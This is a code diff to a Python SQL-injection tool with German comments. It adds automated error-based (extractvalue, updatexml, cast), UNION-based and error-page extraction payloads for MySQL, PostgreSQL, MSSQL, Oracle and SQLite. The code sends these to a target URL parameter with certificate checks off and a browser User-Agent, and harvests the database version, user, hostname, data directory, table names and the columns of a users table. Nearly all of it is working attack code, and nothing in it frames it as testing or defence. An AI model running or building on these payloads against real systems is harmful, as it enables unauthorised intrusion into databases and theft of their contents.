@@ -198,11 +198,86 @@ def _send_request(target, payload, param='id'):
         return {'status': 0, 'size': 0, 'time': 0, 'error': str(e)}
 
 
+def _try_extract_single(target, param, payload, patterns):
+    """Sende einen Payload und versuche mit mehreren Patterns zu extrahieren"""
+    try:
+        url = f'{target}?{param}={requests.utils.quote(payload)}'
+        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
+                           headers={'User-Agent': 'Mozilla/5.0'})
+        if not resp.text:
+            return None
+        for pat in patterns:
+            m = re.search(pat, resp.text, re.IGNORECASE)
+            if m:
+                val = m.group(1).strip()
+                if val and 1 < len(val) < 500:
+                    return val
+        # XPATH Syntax Error Fallback
+        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})', resp.text, re.I)
+        if xpath_m:
+            val = xpath_m.group(1).strip('~').strip()
+            if val and len(val) > 1:
+                return val
+    except Exception:
+        pass
+    return None
+
+
 def _try_extract_data(target, db_type='mysql', param='id'):
-    """Versuche tatsaechlich DB-Daten zu extrahieren - AGGRESSIV"""
+    """Versuche tatsaechlich DB-Daten zu extrahieren - XPATH Error + UNION + UPDATEXML"""
     extracted = []
     seen = set()
     
+    # ===== 1. XPATH ERROR-BASED EXTRAKTION (zuverlaessigste Methode) =====
+    xpath_map = {
+        'mysql': {
+            'DB-Version': "1' AND extractvalue(1,concat(0x7e,version(),0x7e))--",
+            'DB-Name': "1' AND extractvalue(1,concat(0x7e,database(),0x7e))--",
+            'DB-User': "1' AND extractvalue(1,concat(0x7e,user(),0x7e))--",
+            'Hostname': "1' AND extractvalue(1,concat(0x7e,@@hostname,0x7e))--",
+            'Datadir': "1' AND extractvalue(1,concat(0x7e,@@datadir,0x7e))--",
+            'Tabellen': "1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
+            'Spalten': "1' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users'),0x7e))--",
+            'Tabellen-Anzahl': "1' AND extractvalue(1,concat(0x7e,(SELECT count(*) FROM information_schema.tables WHERE table_schema=database()),0x7e))--",
+        },
+        'postgresql': {
+            'DB-Version': "1' AND 1=cast((SELECT version()) as integer)--",
+            'DB-Name': "1' AND 1=cast((SELECT current_database()) as integer)--",
+            'DB-User': "1' AND 1=cast((SELECT current_user) as integer)--",
+            'Tabellen': "1' AND 1=cast((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') as integer)--",
+        },
+        'mssql': {
+            'DB-Version': "1' AND 1=@@version--",
+            'DB-Name': "1' AND 1=DB_NAME()--",
+            'DB-User': "1' AND 1=SYSTEM_USER--",
+            'Tabellen': "1' AND 1=(SELECT STRING_AGG(name,',') FROM sys.tables)--",
+        },
+        'oracle': {
+            'DB-Version': "1' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+            'DB-Name': "1' OR 1=utl_inaddr.get_host_name((SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL))--",
+            'Tabellen': "1' OR 1=utl_inaddr.get_host_name((SELECT LISTAGG(table_name,',') FROM user_tables))--",
+        },
+        'sqlite': {
+            'DB-Version': "1' AND sqlite_version()||randomblob(1000000000)--",
+            'Tabellen': "1' AND (SELECT group_concat(name,',') FROM sqlite_master WHERE type='table')||randomblob(1000000000)--",
+        },
+    }
+    
+    db_xpath = xpath_map.get(db_type, xpath_map['mysql'])
+    xpath_patterns = [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})',
+                      r'ORA-\d+:\s*([^\r\n<]{3,200})', r'ERROR:\s*([^\r\n<]{3,200})']
+    
+    for label, payload in db_xpath.items():
+        val = _try_extract_single(target, param, payload, xpath_patterns)
+        if val and f"xpath:{label}:{val[:50]}" not in seen:
+            seen.add(f"xpath:{label}:{val[:50]}")
+            if label in ('Tabellen', 'Spalten') and ',' in val:
+                items = [x.strip() for x in val.split(',')[:15]]
+                extracted.append(f"{label}: {', '.join(items)}")
+            else:
+                extracted.append(f"{label}: {val}")
+    
+    # ===== 2. UNION SELECT MARKER EXTRAKTION =====
     _EXTRACTION_PAYLOADS_SQLMAP = {
         'mysql': {
             'version': [
@@ -239,7 +314,7 @@ def _try_extract_data(target, db_type='mysql', param='id'):
             'tables': [("1' UNION SELECT CONCAT('|||T:',string_agg(table_name,','),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|T:([^\|]+)\|\|\|')],
             'columns': [("1' UNION SELECT CONCAT('|||C:',string_agg(column_name,','),'|||'),NULL,NULL FROM information_schema.columns WHERE table_name='users'--", r'\|\|\|C:([^\|]+)\|\|\|')],
             'counts': [
-                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|N:(\d+)\|\|'),
+                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|N:(\d+)\|\\|'),
                 ("1' UNION SELECT CONCAT('|||H:',inet_server_addr(),'|||'),NULL,NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
             ],
         },
@@ -307,16 +382,66 @@ def _try_extract_data(target, db_type='mysql', param='id'):
                         extracted.append(f"Spalten: {', '.join(cols)}")
                     elif category == 'counts':
                         extracted.append(f"Anzahl Tabellen: {val}")
-                    elif category == 'version':
+                    elif category == 'version' and not any('DB-Version' in e for e in extracted):
                         extracted.append(f"DB-Version: {val}")
-                    elif category == 'database':
+                    elif category == 'database' and not any('DB-Name' in e for e in extracted):
                         extracted.append(f"DB-Name: {val}")
-                    elif category == 'user':
+                    elif category == 'user' and not any('DB-User' in e for e in extracted):
                         extracted.append(f"DB-User: {val}")
                     else:
                         extracted.append(f"{label}: {val}")
             except Exception:
                 continue
+    
+    # ===== 3. UPDATEXML FALLBACK (MySQL) =====
+    if db_type == 'mysql':
+        uxml = {
+            'DB-Version': "1' AND updatexml(1,concat(0x7e,version(),0x7e),1)--",
+            'DB-Name': "1' AND updatexml(1,concat(0x7e,database(),0x7e),1)--",
+            'DB-User': "1' AND updatexml(1,concat(0x7e,user(),0x7e),1)--",
+            'Tabellen': "1' AND updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1)--",
+        }
+        for lbl, pld in uxml.items():
+            val = _try_extract_single(target, param, pld, [r'~([^~]+)~'])
+            if val and f"xml:{lbl}:{val[:50]}" not in seen:
+                seen.add(f"xml:{lbl}:{val[:50]}")
+                if lbl == 'Tabellen' and ',' in val:
+                    extracted.append(f"Tabellen: {', '.join([x.strip() for x in val.split(',')[:15]])}")
+                elif not any(lbl in e for e in extracted):
+                    extracted.append(f"{lbl}: {val}")
+    
+    # ===== 4. RESPONSE SCAN - Letzter Versuch =====
+    try:
+        url = f'{target}?{param}={requests.utils.quote(chr(39))}'
+        resp = requests.get(url, timeout=15, verify=False, allow_redirects=False,
+                           headers={'User-Agent': 'Mozilla/5.0'})
+        if resp.text:
+            # MySQL/MariaDB Version aus Fehlermeldung
+            if db_type in ('mysql', 'unknown') and not any('DB-Version' in e for e in extracted):
+                m = re.search(r'([\d\.]+[\-a-zA-Z]*-MariaDB[\-a-zA-Z\d\.]*)', resp.text, re.I)
+                if m:
+                    extracted.append(f"DB-Version: {m.group(1)}")
+                else:
+                    m = re.search(r'MySQL[^\d]*([\d\.]+)', resp.text, re.I)
+                    if m:
+                        extracted.append(f"DB-Version: MySQL {m.group(1)}")
+            # PostgreSQL
+            if db_type == 'postgresql' and not any('DB-Version' in e for e in extracted):
+                m = re.search(r'(PostgreSQL\s+[\d\.]+)', resp.text, re.I)
+                if m:
+                    extracted.append(f"DB-Version: {m.group(1)}")
+            # MSSQL
+            if db_type == 'mssql' and not any('DB-Version' in e for e in extracted):
+                m = re.search(r'(Microsoft[^<\r\n]{0,100}SQL\s+Server[^<\r\n]{0,100})', resp.text, re.I)
+                if m:
+                    extracted.append(f"DB-Version: {m.group(1).strip()}")
+            # Oracle
+            if db_type == 'oracle' and not any('DB-Version' in e for e in extracted):
+                m = re.search(r'(ORA-\d+[^<\r\n]{3,100})', resp.text)
+                if m:
+                    extracted.append(f"DB-Error: {m.group(1).strip()}")
+    except Exception:
+        pass
     
     return extracted
 
